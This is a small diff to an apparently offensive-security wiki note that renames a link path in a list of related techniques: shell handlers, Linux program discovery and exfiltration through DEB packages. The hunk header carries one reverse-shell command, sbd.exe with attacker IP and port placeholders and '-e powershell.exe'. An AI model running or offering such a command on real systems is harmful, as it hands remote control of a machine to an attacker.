@@ -118,7 +118,7 @@ C:\> .\sbd.exe <attacker_IP> <attacker_PORT> -e powershell.exe
 
 - [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Shell Handler/Cross Platform/Manual/Netcat Variants/Secure Back Door|Shell Handler: Secure Back Door]]
 
-- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xE - Discover Programs/Manual/Living off the Land|Enumeration and Discovery: Discover Programs]]
+- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xE - Discover Programs/Manual/Living off the Land|Enumeration and Discovery: Discover Programs]]
 
 - [[DEB|File Transfer and Data Exfiltration: Linux Package Manager DEB]]
 
